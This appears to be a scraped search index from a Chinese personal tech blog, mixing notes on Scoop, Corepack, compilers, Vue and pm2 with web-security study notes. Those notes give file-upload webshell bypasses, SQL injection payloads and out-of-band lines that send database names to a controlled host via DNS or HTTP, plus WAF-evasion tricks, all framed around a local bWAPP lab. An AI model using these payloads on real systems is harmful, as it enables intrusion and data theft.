git\n更新全部已安装软件\nscoop update *\n导出已安装软件列表\nscoop.cmd export \u0026gt; App_list.txt\n添加官方的bucket（包含大量的软件）\nscoop bucket add main scoop bucket add extras\n更新仓库\nscoop updat\n限制软件更新\nscoop hold git\n代理\nscoop config proxy 127.0.0.1:7890\n取消代理\nscoop config proxy none\n查看其他scoop命令\nscoop help\n","permalink":"https://99999.fun/posts/150/","summary":"Scoop是windows平台下开源的命令行软件包管理器，类似于ubuntu的apt或者macOS的brew\nscoop仓库里面全部都是通过审核的绿色软件包（前提是不要乱用来路不明的scoop源）\n允许执行本地脚本权限\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser\n修改Scoop安装目录（用户级）\n$env:SCOOP=\u0026lsquo;D:\\Software\\Scoop\u0026rsquo; [Environment]::SetEnvironmentVariable(\u0026lsquo;SCOOP\u0026rsquo;, $env:SCOOP, \u0026lsquo;User\u0026rsquo;)\n修改Scoop安装目录（全局）\n$env:SCOOP_GLOBAL=\u0026lsquo;D:\\Software\\Scoop\\Global\u0026rsquo; [Environment]::SetEnvironmentVariable(\u0026lsquo;SCOOP_GLOBAL\u0026rsquo;, $env:SCOOP_GLOBAL, \u0026lsquo;Machine\u0026rsquo;)\n目录介绍： apps：通过scoop安装的软件存储的目录\nbuckets：管理软件的仓库目录（记录了哪些仓库有哪些软件）\nchache：软件安装包目录\npersit：存储用户数据，与软件分离\nshims；软链接\n安装scoop\niwr -useb get.scoop.sh | iex\n或者\niex (new-object net.webclient).downloadstring(\u0026lsquo;https://get.scoop.sh\u0026rsquo;)\n安装软件\nscoop install sudo\n查看环境存在的问题\nscoop checkup\n将一些scoop环境必须的软件安装一下\n搜索软件\nscoop search git\n安装软件\nscoop install git\n查看软件信息\nscoop info git\n查看已经安装的软件\nscoop list\n卸载软件（-p删除配置）\nscoop uninstall git -p\n更新软件\nscoop update git\n更新全部已安装软件\nscoop update *","title":"简单使用Scoop包管理器"},{"content":"Corepack（管理yarn和pnpm的包管理器的管理器）\ncorepack是nodejs官方内置的CLI，nodejs16.9.0版本及其以上版本默认携带corepack一起分发（不需要额外安装corepack，16.9.0版本之下的需要手动安装或者更新nodejs版本）\ncorepack的特点就是不需要安装yarn和pnpm（yarn和pnpm将通过corepack来进行管理安装以及使用），而且还可以限制项目使用特定的包管理器版本（避免一个项目用多个包管理器，而且包管理器的版本还不同的情况）\n手动安装\nnpm install -g corepack\r如果全局已经安装了yarn或者pnpm的话，需要先卸载\nnpm uninstall -g yarn pnpm\r启用corepack\ncorepack enable\r限制包管理器版本\npackage.json\n\u0026quot;packageManager\u0026quot;: \u0026quot;yarn@1.22.19\u0026quot;\r表示该项目只能使用yarn包管理器的1.22.19版本，使用其他版本或者使用pnpm包管理器的话，会报错，例如Usage Error: This project is configured to use yarn\n默认无法限制npm，需要通过corepack enable npm来手动限制，移除限制通过corepack disable npm来处理\n修改packageManager的值后，yarn install，会自动安装指定版本\n安装包管理器（会根据package.json下的packageManager来下载指定版本的包管理器）\nyarn install\r指定一个新的包管理器\ncorepack prepare pnpm@7.13.5 --activate\r使用本地包管理器（会将本地包管理器存储到一个压缩包里，方便离线使用）\n获取\ncorepack prepare --all -o=D:/demo/test.tgz\r启动压缩包内的包\ncorepack hydrate D:/demo/test.tgz\r或者获取完成后立刻使用\ncorepack hydrate D:/demo/test.tgz --activate ","permalink":"https://99999.fun/posts/149/","summary":"Corepack（管理yarn和pnpm的包管理器的管理器）\ncorepack是nodejs官方内置的CLI，nodejs16.9.0版本及其以上版本默认携带corepack一起分发（不需要额外安装corepack，16.9.0版本之下的需要手动安装或者更新nodejs版本）\ncorepack的特点就是不需要安装yarn和pnpm（yarn和pnpm将通过corepack来进行管理安装以及使用），而且还可以限制项目使用特定的包管理器版本（避免一个项目用多个包管理器，而且包管理器的版本还不同的情况）\n手动安装\nnpm install -g corepack\r如果全局已经安装了yarn或者pnpm的话，需要先卸载\nnpm uninstall -g yarn pnpm\r启用corepack\ncorepack enable\r限制包管理器版本\npackage.json\n\u0026quot;packageManager\u0026quot;: \u0026quot;yarn@1.22.19\u0026quot;\r表示该项目只能使用yarn包管理器的1.22.19版本，使用其他版本或者使用pnpm包管理器的话，会报错，例如Usage Error: This project is configured to use yarn\n默认无法限制npm，需要通过corepack enable npm来手动限制，移除限制通过corepack disable npm来处理\n修改packageManager的值后，yarn install，会自动安装指定版本\n安装包管理器（会根据package.json下的packageManager来下载指定版本的包管理器）\nyarn install\r指定一个新的包管理器\ncorepack prepare pnpm@7.13.5 --activate\r使用本地包管理器（会将本地包管理器存储到一个压缩包里，方便离线使用）\n获取\ncorepack prepare --all -o=D:/demo/test.tgz\r启动压缩包内的包\ncorepack hydrate D:/demo/test.tgz\r或者获取完成后立刻使用\ncorepack hydrate D:/demo/test.tgz --activate ","title":"简单使用Corepack-包管理器的管理器"},{"content":"编译就是翻译，将机器语言翻译成另一个机器语言（例如高级语言翻译成低级语言（例如汇编），低级语言翻译成机器语言（二进制））\n编译让计算机理解高级语言并且执行，编译让计算机更理解人，编译提供了人类新的思考方式\n编译的翻译只能作用于形式语言\n编译器和解释器\n编译器将源程序编译成目标的程序\n解释器接收源程序与输入，执行并且返回输出\n混合编译器通常需要2次编译，第一次编译将源程序翻译成目标程序，第二次编译时，将目标程序与输入一起放到虚拟机来处理执行（虚拟机用于跨平台，来处理复杂的执行环境）\n即时编译器，将源程序编译成机器码后再执行\n交叉编译：在一个平台上编译产生多个平台的可执行程序\n编译的过程\n关注度分离\n词法分析（分词，分析词法）\n语法分析（将词分析的结果分析成抽象语法树的过程，也就是AST（Abstract Syntax Tree）），语法分析器被叫为parser\n语义分析：分析抽象语法的语法是否合法\n根据抽象语法树生成的三地址码进行存储，传输，优化\n根据三地址码生成机器码（有一些还需要把机器码编译成可执行应用）\n词法分析：将程序的字符流转换为符号流，分析符号，并且给予描述\n例如：let a = 1\n词法分析后得到\nlet: Keyword a: Variable =: Operator 1: Integer\n词法分析器会将关键字抽离，并且对每个字符作描述\n词法分析器得到返回值是符号元组，符号又叫词法单元（Token）\n词法：构造语句的方法（哪些是具备词性（根据词的特点来区分的语法分类，例如动词，名词等等），哪些是具备词语（具有意义的词，关键字）），通常使用正则表达式来描述词法，使用状态机来实现正则表达式\n字母表（alphabet）：某个编程语言中允许的全部字符\n串（string）是某个编程语言中的字母序列\n词法分析器将源程序的字符流进行分析，通正则文法过来找到这些词汇，并且给予词性，如果存在不支持的词汇，则报错（也就是分词）\n词法分析器使用了一种叫有限自动机（有限状态机，deterministic finite automaton, DFA）的算法，在分析字符串时，当遇到了关键字时，会改变状态\n有限自动机和图灵机很相似，不过有限自动机只能读取，无法进行计算\n例如：a == 1\n当识别扫描到a时，会处于标识符状态，直到遇到了==，就会切换到比较运算符状态，然后再识别1，知道该值是数值字面量\n语法分析\n语法分析的过程就是在词法分析的基础上分析程序的语法结构，这个语法结构是树状的，这个树叫抽象语法树（Abstract Syntax Tree，AST），树节点是语法单元，可通过递归下降算法或者自底向上算法来构造该树状\n语法制导翻译\n","permalink":"https://99999.fun/posts/148/","summary":"编译就是翻译，将机器语言翻译成另一个机器语言（例如高级语言翻译成低级语言（例如汇编），低级语言翻译成机器语言（二进制））\n编译让计算机理解高级语言并且执行，编译让计算机更理解人，编译提供了人类新的思考方式\n编译的翻译只能作用于形式语言\n编译器和解释器\n编译器将源程序编译成目标的程序\n解释器接收源程序与输入，执行并且返回输出\n混合编译器通常需要2次编译，第一次编译将源程序翻译成目标程序，第二次编译时，将目标程序与输入一起放到虚拟机来处理执行（虚拟机用于跨平台，来处理复杂的执行环境）\n即时编译器，将源程序编译成机器码后再执行\n交叉编译：在一个平台上编译产生多个平台的可执行程序\n编译的过程\n关注度分离\n词法分析（分词，分析词法）\n语法分析（将词分析的结果分析成抽象语法树的过程，也就是AST（Abstract Syntax Tree）），语法分析器被叫为parser\n语义分析：分析抽象语法的语法是否合法\n根据抽象语法树生成的三地址码进行存储，传输，优化\n根据三地址码生成机器码（有一些还需要把机器码编译成可执行应用）\n词法分析：将程序的字符流转换为符号流，分析符号，并且给予描述\n例如：let a = 1\n词法分析后得到\nlet: Keyword a: Variable =: Operator 1: Integer\n词法分析器会将关键字抽离，并且对每个字符作描述\n词法分析器得到返回值是符号元组，符号又叫词法单元（Token）\n词法：构造语句的方法（哪些是具备词性（根据词的特点来区分的语法分类，例如动词，名词等等），哪些是具备词语（具有意义的词，关键字）），通常使用正则表达式来描述词法，使用状态机来实现正则表达式\n字母表（alphabet）：某个编程语言中允许的全部字符\n串（string）是某个编程语言中的字母序列\n词法分析器将源程序的字符流进行分析，通正则文法过来找到这些词汇，并且给予词性，如果存在不支持的词汇，则报错（也就是分词）\n词法分析器使用了一种叫有限自动机（有限状态机，deterministic finite automaton, DFA）的算法，在分析字符串时，当遇到了关键字时，会改变状态\n有限自动机和图灵机很相似，不过有限自动机只能读取，无法进行计算\n例如：a == 1\n当识别扫描到a时，会处于标识符状态，直到遇到了==，就会切换到比较运算符状态，然后再识别1，知道该值是数值字面量\n语法分析\n语法分析的过程就是在词法分析的基础上分析程序的语法结构，这个语法结构是树状的，这个树叫抽象语法树（Abstract Syntax Tree，AST），树节点是语法单元，可通过递归下降算法或者自底向上算法来构造该树状\n语法制导翻译","title":"编译原理学习笔记"},{"content":"组件的渲染，更新\n组件的渲染：通过组件的模板创建vnode，渲染vnode，生成DOM\nvue应用的初始化\nimport { createApp } from 'vue'\rimport App from './app'\rconst app = createApp(App)\rapp.mount('#app')\r通过上面例子看到vue将app应用挂载到根组件上（一般是id为app的dom节点），通过createApp()函数，对外暴露vue，createApp()方法主要作用是创建app应用，以及重写mount方法，最后返回app应用\n通过createApp()源码，可以看到createApp()接收一个参数，这个参数也就是app应用（根组件），createApp()创建app应用是通过ensureRenderer()的createApp()创建的\nensureRenderer()用于创建一个惰性渲染器对象（延时创建，这样的好处是当只使用响应式包时，不需要打包渲染器等渲染逻辑相关的代码）\n","permalink":"https://99999.fun/posts/147/","summary":"组件的渲染，更新\n组件的渲染：通过组件的模板创建vnode，渲染vnode，生成DOM\nvue应用的初始化\nimport { createApp } from 'vue'\rimport App from './app'\rconst app = createApp(App)\rapp.mount('#app')\r通过上面例子看到vue将app应用挂载到根组件上（一般是id为app的dom节点），通过createApp()函数，对外暴露vue，createApp()方法主要作用是创建app应用，以及重写mount方法，最后返回app应用\n通过createApp()源码，可以看到createApp()接收一个参数，这个参数也就是app应用（根组件），createApp()创建app应用是通过ensureRenderer()的createApp()创建的\nensureRenderer()用于创建一个惰性渲染器对象（延时创建，这样的好处是当只使用响应式包时，不需要打包渲染器等渲染逻辑相关的代码）","title":"vuejs底层原理学习笔记"},{"content":"保罗的小宇宙 临轩 狱杰的屋敷 猕猴の那年记忆 一叶三秋 新漫猫 提莫酱的博客 zshMVP 清墨的橘 流星Aday的博客 隔壁小胡的博客 Citrons博客 若志随笔 星云馆 螓首蛾眉 阅读・阅己 北熙宝宝 Sanakeyの小站 百里飞洋の博客 itsNekoDeng 喵二の小博客日语笔记\n","permalink":"https://99999.fun/links/","summary":"保罗的小宇宙 临轩 狱杰的屋敷 猕猴の那年记忆 一叶三秋 新漫猫 提莫酱的博客 zshMVP 清墨的橘 流星Aday的博客 隔壁小胡的博客 Citrons博客 若志随笔 星云馆 螓首蛾眉 阅读・阅己 北熙宝宝 Sanakeyの小站 百里飞洋の博客 itsNekoDeng 喵二の小博客日语笔记","title":"链接"},{"content":"","permalink":"https://99999.fun/categories/","summary":"","title":"分类"},{"content":"","permalink":"https://99999.fun/tags/","summary":"","title":"标签"},{"content":"安装pm2\nnpm install pm2 -g\n执行app.js文件并且监听app.js的变化，-i为进程数，max表示当前cpu可启动的最大进程\npm2 start app.js \u0026ndash;watch -i max \u0026ndash;ignore-watch=\u0026ldquo;node_modules\u0026rdquo; \u0026ndash;name demo\n\u0026ndash;ignore-watch=\u0026ldquo;node_modules\u0026quot;为忽略监听指定的目录或者文件，这里忽略的是node_modules文件夹\n\u0026ndash;name为进程名字\npm2执行npm run dev\npm2 start npm \u0026ndash;watch \u0026ndash; run dev\npm2执行npm run start\npm2 start npm \u0026ndash;name demo \u0026ndash; run start\n查看PM2中的进程信息\npm2 list\n查看指定进程id的信息\npm2 show 0\n重启指定进程id的进程\npm2 restart 0\n重启全部进程\npm2 restart all\n停止指定进程id的进程\npm2 stop 0\n删除指定进程id的进程\npm2 delete 0\n查看全部进程的日志\npm2 logs\n清空所有日志文件\npm2 flush\n","permalink":"https://99999.fun/posts/pm2/","summary":"安装pm2\nnpm install pm2 -g\n执行app.js文件并且监听app.js的变化，-i为进程数，max表示当前cpu可启动的最大进程\npm2 start app.js \u0026ndash;watch -i max \u0026ndash;ignore-watch=\u0026ldquo;node_modules\u0026rdquo; \u0026ndash;name demo\n\u0026ndash;ignore-watch=\u0026ldquo;node_modules\u0026quot;为忽略监听指定的目录或者文件，这里忽略的是node_modules文件夹\n\u0026ndash;name为进程名字\npm2执行npm run dev\npm2 start npm \u0026ndash;watch \u0026ndash; run dev\npm2执行npm run start\npm2 start npm \u0026ndash;name demo \u0026ndash; run start\n查看PM2中的进程信息\npm2 list\n查看指定进程id的信息\npm2 show 0\n重启指定进程id的进程\npm2 restart 0\n重启全部进程\npm2 restart all\n停止指定进程id的进程\npm2 stop 0\n删除指定进程id的进程\npm2 delete 0\n查看全部进程的日志\npm2 logs\n清空所有日志文件\npm2 flush","title":"简单使用Pm2---node进程管理工具"},{"content":"关于本站\n这是本人的个人博客，分享一些本人学习过程中写的笔记\n好记性不如烂笔头\n如果文章出现错误或者不正确的地方，欢迎联系本人的邮箱，进行纠正，笔记会根据学习进度来进行更新或者修改\n本站未注明转载的文章均为原创，转载请标明来源\n本站点基于强大的hugo构建完成\n免责声明\n本站内容仅供学习和参阅使用，本网站内容仅代表作者本人的观点，内容仅供阅读，如有任何问题，欢迎联系站长（email：chenjunlinabc123@qq.com），将会在第一时间为您做相关处理\n自述：\n2002年生人，星座：摩羯座\n偏好语言：JavaScript(TypeScript)，Python，Golang，Rust，C++\n家里蹲公司的一名干饭攻城狮\n最喜欢的游戏：CSGO，塞尔达传说：旷野之息，王者荣耀\n看完的小说：全职法师，雪鹰领主，吞噬星空，星辰变，牧龙师\n目前在看小说：完美世界\n设备：ThinkBook 14p Gen 2（Windows11操作系统，5800H处理器，16G内存，1TB硬盘）\n联系方式：\nQQ：195551690\nEmail：chenjunlinabc123@qq.com\nGitHub：https://github.com/chenjunlinabc\n在看书籍：\nGO语言学习笔记，数学之美，深入浅出Docker，GO语言核心编程，JavaScript高级程序设计，深入浅出Nodejs，React进阶之路，Redis实战，深入浅出React和Redux，深入理解TypeScript，前端技术架构与工程，labuladong的算法小抄，算法图解，Python3网络爬虫开发实战，前端架构：从入门到微前端，前端开发核心知识进阶：从夯实基础到突破瓶颈，Vue.js设计与实现，MongoDB进阶与实战:微服务整合、性能优化、架构管理，Angular开发入门与实战，React设计原理\n","permalink":"https://99999.fun/about/","summary":"关于本站\n这是本人的个人博客，分享一些本人学习过程中写的笔记\n好记性不如烂笔头\n如果文章出现错误或者不正确的地方，欢迎联系本人的邮箱，进行纠正，笔记会根据学习进度来进行更新或者修改\n本站未注明转载的文章均为原创，转载请标明来源\n本站点基于强大的hugo构建完成\n免责声明\n本站内容仅供学习和参阅使用，本网站内容仅代表作者本人的观点，内容仅供阅读，如有任何问题，欢迎联系站长（email：chenjunlinabc123@qq.com），将会在第一时间为您做相关处理\n自述：\n2002年生人，星座：摩羯座\n偏好语言：JavaScript(TypeScript)，Python，Golang，Rust，C++\n家里蹲公司的一名干饭攻城狮\n最喜欢的游戏：CSGO，塞尔达传说：旷野之息，王者荣耀\n看完的小说：全职法师，雪鹰领主，吞噬星空，星辰变，牧龙师\n目前在看小说：完美世界\n设备：ThinkBook 14p Gen 2（Windows11操作系统，5800H处理器，16G内存，1TB硬盘）\n联系方式：\nQQ：195551690\nEmail：chenjunlinabc123@qq.com\nGitHub：https://github.com/chenjunlinabc\n在看书籍：\nGO语言学习笔记，数学之美，深入浅出Docker，GO语言核心编程，JavaScript高级程序设计，深入浅出Nodejs，React进阶之路，Redis实战，深入浅出React和Redux，深入理解TypeScript，前端技术架构与工程，labuladong的算法小抄，算法图解，Python3网络爬虫开发实战，前端架构：从入门到微前端，前端开发核心知识进阶：从夯实基础到突破瓶颈，Vue.js设计与实现，MongoDB进阶与实战:微服务整合、性能优化、架构管理，Angular开发入门与实战，React设计原理","title":"关于"},{"content":"常见web工具：\nburpsuite：通过代理渗透，可重放HTTP请求，来分析HTTP响应\ncurl：通过url方式传输数据，可用于抓取页面（执行请求），监控网络等等\npostmain\nhackbar quantum\nwappalyzer\n文件上传漏洞：没有足够的安全约束的情况下，允许上传恶意文件，例如恶意脚本，webshell等等\n文件上传漏洞关键点在于绕过\n由于法律限制的原因，禁止对其他网站非法攻击，因此需要在本地或者在自己的服务器上建立靶场渗透环境，这边使用的是bwapp（全称为buggy web Application）\n这边使用的是docker运行bwapp，也可以下载bwapp，来自己搭建（https://sourceforge.net/projects/bwapp/files/）\ndocker pull raesene/bwapp\ndocker run -d -p 0.0.0.0:80:80 raesene/bwapp\n访问127.0.0.1/install.php\n点击here来初始化，或者直接访问127.0.0.1/install.php?install=yes\n创建账号信息，点击new user，或者直接访问127.0.0.1/user_new.php\n点击login，或者直接访问127.0.0.1/login.php，根据刚才的账号信息进行登录\n简单接触文件上传漏洞\nchose your bug选择unrestricted File Upload（未经严格审记的文件上传），安全级别选择low（set your security level）\n上传一句话木马，创建shell.php文件，添加\n通过curl触发，执行curl -d \u0026rsquo;test=echo getcwd();\u0026rsquo; http://127.0.0.1/images/shell.php\n可以看到成功触发shell.php，并且服务器返回了当前执行的目录\n后缀名绕过\n安全级别选择medium（set your security level）\n常见后缀名验证方式有，黑名单（禁止哪些后缀上传），白名单（只允许哪些后缀上传）\n这里的靶场环境的web server为Apache，因此需要了解Apache解析器模块\n.htaccess绕过，当黑名单没有限制上传.htaccess文件时，并且web sever也支持.htaccess时\n上传.htaccess文件，内容为：AddType application/x-httpd-php jpg\n上传木马，shell.jpg\nAddType application/x-httpd-php jpg的意思是，jpg文件按照php文件的方式解析\n大小写绕过\n大小写用于Windows平台环境下，在Windows中，大小写是不敏感的，而在Linux环境下，大小写是敏感的\nWindows文件流绕过\n利用windows平台的NTFS文件系统的文件流特性，设置文件时，默认使用未命名的文件流，但是也可以创建其他命名的文件流\n例如：\necho hallo,word \u0026gt; hallo.txt:a.txt\recho hallo \u0026gt; hallo.txt\recho 666 \u0026gt; hallo.txt::$data\r第一个例子中，hallo,word并没有写入到hallo.txt，而是写入到了hallo.txt下的a.txt文件流中\n第三个例子中，666写入到了hallo.txt默认文件流中\n针对于白名单进行绕过\n截断绕过（环境要求：php\u0026gt;5.3.42，magic_quotes_gpc关闭）\n搭配burpsuite来拦截http请求\n上传shell.php，通过拦截修改请求报文，修改为shell.php$00.jpg\n$00在url中会解析为0，而在ASCII中0又表示为字符串结束，因此当url出现$00时，表示字符串读取结束\n因此在上传shell.php$00.jpg时，对于先上传后检测的服务端来说，实质上传的是shell.php\nSQL注入\nSQL注入漏洞是用户应用层与数据库层的安全漏洞\n发生SQL注入的原因就是用户应用层提供的数据存在恶意SQL语句，当这些恶意SQL语句不被审查就执行的话是非常危险的，例如在一些输入框（比如搜索框）中提交一些恶意SQL语句，因为后端需要根据用户提供的数据来动态的构造SQL查询语句，而且这些动态参数存在恶意SQL语句时又没有进行过滤审查，将导致SQL注入漏洞触发\n过程：通过数据库管理系统执行SQL命令，并且将数据库管理系统的执行结果返回给web服务器，web服务器再将结果进行整合成html网页，最后发送给客户端\nGET型SQL注入漏洞是指使用GET请求方法进行URL链接拼接，来获取到超越权限的数据\nGET型SQL注入漏洞\n方法1：利用UNION操作符，并且通过SELECT 1,2,3,4,5来查找可以显示多少字段数据\nUNION SELECT 1,user(),database(),table_name,version() FROM INFORMATION_SCHEMA.tables WHERE table_schema=database() \u0026ndash;\n查找INFORMATION_SCHEMA数据库的tables表的使用了当前数据库用户名，当前数据库名称，当前数据库版本，以及当前数据库的数据表，后面的\u0026ndash;是sql注释，也可以使用#来注释掉后面的sql命令\n当查找到的数据表存在敏感名称时，例如user时，可对敏感名称的表进行查找\nUNION SELECT 1,columns,3,4,5 FROM INFORMATION_SCHEMA.columns WHERE table_name=\u0026lsquo;user\u0026rsquo; \u0026ndash;\n通过上面的命令查找user表的字段，当出现password，login等字段时，可以确定为后台的登录密码以及用户\nUNION SELECT 1,password,login,4,5 FROM user \u0026ndash;\n通过上面的命令查找user表的password和login字段\n注意：一般来说password字段返回的数据都是加密过的，而且绝大多加密算法都是不可逆的，只能通过彩虹表来碰撞\nPOST型SQL注入漏洞（主要通过http请求工具，因为post请求不是通过url发送的，http请求工具例如postman或者burpsuite，触发的方法和get型类似）\n判断SQL注入点\n能够与数据库进行交互，并且可以提交参数到网页时，那么可能存在sql注入\n单引号判断法\nhttps://webtest.xiaochenabc123.test.com?id=1'\n如果页面报错则存在SQL注入，因为sql会因为单引号个数不成对而导致sql执行错误而报错\n判断注入的参数类型（如果参数可以输入非整型，则直接使用字符串型）\n整型\nSELECT * FROM test where id = and 1=1\n字符串型\nSELECT * FROM test where id = \u0026lsquo;1\u0026rsquo; and \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo;\n百分号判断法\n针对于使用了LIKE关键字的\nhttps://webtest.xiaochenabc123.test.com?id=1$' and \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo; \u0026ndash;\n简单的SQL注入防御方法：\n减低错误信息的提供\n使用mysql_escape_string($id)转义，将\u0026rsquo;转义\n过滤and，or，union，select等等关键词（黑名单）\nSQL注入漏洞主要的类型：布尔型注入，可联合查询注入，基于时间延迟注入，报错型注入，可多语句查询注入\n布尔型注入\nhttps://webtest.xiaochenabc123.test.com/?id=1' and substring(version) = 5\u0026ndash;\n布尔型注入被用于盲注，上面的例子中是通过布尔型注入来判断一下数据库版本是否为5，如果是的，那么将会是正常请求\n联合查询注入（使用UNION关键字来拼接自己想要执行的SQL语句）\n基于时间延迟注入（通过判断请求响应的时间来得到想要的信息，盲注，当页面不会提供报错信息时，布尔型注入也无效时采用）\nhttps://webtest.xiaochenabc123.test.com/?id=1' and slepp(5)\u0026ndash;\nslepp函数的作用是当sql语句执行完成后等待指定秒数再去返回执行结果，通过感觉时间来确定该语句是否正常执行\n报错型注入（如果页面可以返回sql报错信息时使用，通过报错信息中获取数据）\n多语句查询型注入（当页面可以执行多条SQL语句时）\n例如：https://webtest.xiaochenabc123.test.com/?id=1; SELECT * FROM test where id =1\u0026ndash;\n多语句查询型注入可以使用时，很大可能UPDATA数据库更新或者删除数据库可以触发\nHTTP头注入\n利用http请求头，当web服务器需要从http请求头中获取信息到数据库中时（针对不进行过滤审查就直接进行数据库操作时）\n通过http请求工具，例如postman或者burpsuite，修改请求头，重放攻击\nUser-Agent: abc\u0026rsquo;, (SELECT database()) \u0026ndash;\n堆叠注入（多条sql命令一起执行）\n使用;结束当前sql命令后继续执行下一条sql命令\n联合注入和堆叠注入区别：联合注入只能进行查询操作（取决于sql命令的拼接头是查询还是更新还是删除，或者插入），而堆叠注入可以执行任意sql命令\n一般实质环境中堆叠注入用不到（可以会出现权限问题），但是一用到就威力无穷\nOOB注入（out of band，带外通道技术）\n通过生成请求体来攻击，目标服务器接收到恶意的请求体后，进一步处理，处理的过程中目标服务器可能要向外部发送请求或者向外部获取资源，而这个外部实质是攻击者控制的服务器，在进行外部的请求时，将数据一起发送给攻击者控制的服务器，最后在攻击者控制的服务器查看数据（例如：通过dns记录来显示）\nhttps://test1.xiaochenabc123.test.com/?id=1' and SELECT CONCAT(\u0026rsquo;\\\\\u0026rsquo;,(SELECT database(),\u0026rsquo;.test2.xiaochenabc123.test.com\u0026rsquo;);\nhttps://test1.xiaochenabc123.test.com/?id=1' and SELECT LOAD_FILE(CONCAT(\u0026rsquo;\\\\\u0026rsquo;,(SELECT database(),\u0026rsquo;.test2.xiaochenabc123.test.com\u0026rsquo;));\n最后在DNS记录中查看到想要的数据，上面的例子是获取当前的数据库名\n利用HTTP协议来OOB注入\nhttps://test1.xiaochenabc123.test.com/?id=1' and SELECT UTL_HTTP.REQUEST(https://test2.xiaochenabc123.test.com/test.php \u0026lsquo;||\u0026rsquo;?id=\u0026rsquo;||(SELECT database())) FROM dual;\n上面的例子是通过https://test2.xiaochenabc123.test.com的test.php记录传递的数据，并且写入到test.txt中\n混淆和绕过\n一般的注入攻击会被WAF检测和过滤掉，而混淆和绕过就是针对WAF防御的手段\n过滤词绕过\nOR可使用||绕过，AND可使用\u0026amp;\u0026amp;绕过\nunion被过滤可使用||来绕过，例如：https://test1.xiaochenabc123.test.com/?id=1\u0026rsquo; ||(SELECT user FROM usermain limit 1,1) = \u0026lsquo;root\u0026rsquo;\nlimit被过滤，可通过GROUP BY语句创建一个虚拟表，来绕过，例如：https://test1.xiaochenabc123.test.com/?id=1\u0026rsquo; || SELECT min(user),id FROM usermain GROUP BY user HAVING user=\u0026lsquo;root\u0026rsquo;\nGROUP BY被过滤，可通过SUBSTR()函数和GROUP_CONCAT()函数绕过，例如：https://test1.xiaochenabc123.test.com/?id=1\u0026rsquo; || SELECT SUBSTR((SELECT GROUP_CONCAT(user)user FROM usermain),1,1)\nSELECT和引号被过滤，可通过SUBSTR()函数绕过，例如：https://test1.xiaochenabc123.test.com/?id=1\u0026rsquo; || SUBSTR(user,1,1=0x72)\n空格被过滤，可通过/**/来替代空格来分开sql语句\n等号被过滤，可通过like关键字绕过\n双写绕过：例如union被过滤，可使用ununionion来替代，当ununionion被union被过滤机制处理后，将中间的union替代为空，导致左右两边合在了一起，从而达到绕过的目的、\n双重编码绕过：当某个url编码的参数会被WAF编码过滤时，可对参数进行二次编码，让WAF解第一层编码，但是还有第二层编码，从而达到绕过的目的\n编码注入（url编码）：%27表示\u0026rsquo;，%23表示#，%df表示无意义，%5c表示\\，%3d表示=，%2A表示*，例如：https://test1.xiaochenabc123.test.com/?id=1 %df SELECT %2A FROM test where id %3d 1 %23\n二次注入：数据库存储的数据并不安全，不应该直接调用数据库的数据，例如admin\u0026rsquo;#\n提权\nLinux的特殊权限\nSUID（Set UID）：除了rwx权限外的s权限，当某个普通用户具备运行具备SUID权限的文件时，那么当运行该文件，将会使用该文件所有者的身份去执行该文件，只要执行一结束，该身份将会消失\n例如passwd命令，该命令具备SUID权限，当执行该命令时，将表示使用root身份来执行passwd命令，从而修改/usr/bin/passwd这个密码记录文件（该文件普通用户没有任何权限，当然权限只能限制普通用户，root用户是不会被限制的）\n注意：SUID的特性，必须具备可执行权限，而且只对可执行文件有效，目录以及不可执行文件无效，提升权限的效果只在文件执行过程有效，执行结束则身份恢复，s权限必须在所有者权限上（也就是-rws\u0026ndash;x\u0026ndash;x）\nSGID（Set GID）：当s权限出现在所属组中将变成SGID权限，如：-rwx\u0026ndash;s\u0026ndash;x，同样SGID只对可执行文件有效，而且其他用户具备可执行文件，一样只在执行过程中有效\n该特殊权限的特性：在执行该具备SGID特殊权限的可执行文件时，当前用户的组身份将变成文件所属组的身份，赋予的是所属组的权限\n注意：SGID对目录也是具备效果的，只不过当目录被赋予SGID权限后，不是执行触发，而且进入该目录就会触发特性，但是前提是该目录对于普通用户具备rwx权限，这样才能发挥SGID在目录的全部功能\nSBIT（Stick BIT）：t权限，该特殊权限只对目录有效，当目录具备了SBIT特殊权限后，那么不管用户在该目录下创建的文件还是目录，都是只有该用户和root用户有权限修改和删除\n该权限的表示为：drwxrwxrwt，哪怕其他用户具备该目录的全部权限\nDDOS攻击（分布式拒绝服务攻击）\n原理：利用TCP/IP协议族的漏洞，来对目标服务器发送数据流，当超过服务器的处理能力或者服务器的带宽被饱和了，将导致服务器崩溃或者服务器网络崩溃，常见的DDOS攻击有：UDP泛洪攻击，DNS放大攻击，ICMP泛洪攻击，内存缓存放大攻击，SYN泛洪攻击，PING泛洪攻击，NTP放大攻击，ACK泛洪攻击，HTTP泛洪攻击（也就是CC攻击），Slowloris攻击，HTTP Post DDOS攻击等等\nUDP泛洪攻击：利用UDP不需要建立连接就可以发送数据包的特性，大量发送UDP数据包给目标服务器的随机端口，当服务器接收到UDP数据包时，如果该端口没有应用在监听接收数据，会给发送方发送一个数据包，来表示目标端口不可用，当量大到一定程度时，服务器将无法对合法数据进行反应，从而达到拒绝服务的目的，对于会给发送方发送数据包，可进行伪造IP地址，不但不会作用到攻击机上，还做到了匿名\nDNS放大攻击：利用DNS服务器，对DNS服务器发送DNS请求响应，但是该请求包被伪造成了目标服务器的IP，DNS服务器将会向目标服务器发送大量的数据包，从而造成网络阻塞，来达到拒绝服务的目的\nICMP泛洪攻击：通过不断发送ICMP ECHO REQUEST来对消耗目标服务器的处理器资源和带宽\n攻击者控制的僵尸机对目标服务器发送ICMP ECHO REQUEST，目标服务器需要返回ICMP ECHO 